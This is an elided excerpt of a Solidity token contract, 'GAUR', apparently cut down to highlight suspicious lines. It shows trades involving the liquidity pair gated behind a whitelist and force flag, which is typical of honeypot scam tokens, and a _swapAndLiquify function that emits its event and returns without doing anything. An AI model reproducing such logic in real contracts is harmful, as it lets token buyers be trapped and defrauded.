...
contract GAUR is ERC20Interface, Owned {
    ...
    bool private force2ndStep = true;
    ...
    function transfer(address to, uint tokens) public returns (bool success) {
        ...
        if(force1stStep || _in1stWhiteList(msg.sender, to) || (msg.sender != pair && to != pair)){
            balances[msg.sender] = balances[msg.sender].sub(tokens);
    ...
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        ...
        if(force1stStep || _in1stWhiteList(from, to) || (from != pair && to != pair)){
            balances[from] = balances[from].sub(tokens);
            allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
            toBlackHole = tokens.div(1000);
            balances[blackHole] = balances[blackHole].add(toBlackHole);
    ...
    function _swapAndLiquify(uint256 tokens) private lockTheSwap {
        emit SwapAndLiquify(tokens, tokens, tokens);
        return;
        if(tokens == 0) return;
